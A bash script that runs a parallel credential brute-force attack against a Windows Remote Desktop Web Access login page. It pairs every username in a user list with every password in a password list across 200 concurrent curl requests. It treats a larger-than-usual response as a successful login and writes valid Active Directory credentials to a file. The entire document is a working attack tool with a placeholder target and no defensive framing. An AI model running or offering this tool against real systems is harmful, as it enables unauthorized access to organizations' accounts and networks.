#!/bin/bash

# Function to make a login attempt and check response size
make_login_attempt() {
  username="$1"
  password="$2"

  # Modify the curl request with the updated headers and data by replacing 'ADName' and 'youripordomain' with your own (Copied from Mozilla)

  response=$(curl -s https://www.youripordomain.com/RDWeb/Pages/en-US/login.aspx -X POST -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate, br" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: https://www.youripordomain.com" -H "Connection: keep-alive" -H "Referer: https://www.youripordomain/RDWeb/Pages/en-US/login.aspx" -H "Cookie: TSWAFeatureCheckCookie=true; TSWAAuthClientSideCookie=Name=ADName^%^5Csampleusername&MachineType=private&WorkSpaceID=ADDS01.AdName.org" -H "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: same-origin" -H "Sec-Fetch-User: ?1" -H "TE: trailers" --data-raw "WorkSpaceID=ADDS01.ADName.org&RDPCertificates=&PublicModeTimeout=20&PrivateModeTimeout=240&WorkspaceFriendlyName=Work^%^2520Resources&EventLogUploadAddress=&RedirectorName=&ClaimsHint=&ClaimsToken=&isUtf8=1&flags=4&DomainUserName=ADName^%^5C$username&UserPass=$password&MachineType=private")

  # Get the length of the response
  response_length=$(echo -n "$response" | wc -c)

  # Check if the response length is greater than 14683 to determine a successful login (For Windows Server 2019)
  if [ "$response_length" -gt 14683 ]; then
    echo "Username: $username, Password: $password, Response Length: $response_length, Success"
    echo "Username: $username, Password: $password, Response Length: $response_length, Success" >> success_AD.txt
  else
    echo "Username: $username, Password: $password, Response Length: $response_length, Failed"
  fi
}

# Export the function to make it available to parallel
export -f make_login_attempt

# Use -d "\r\n" to specify Windows-style line endings (-j 200 means 200 threads)
parallel -d "\r\n" -j 200 make_login_attempt ::: $(cat AD_users.txt) ::: $(cat pass.txt)
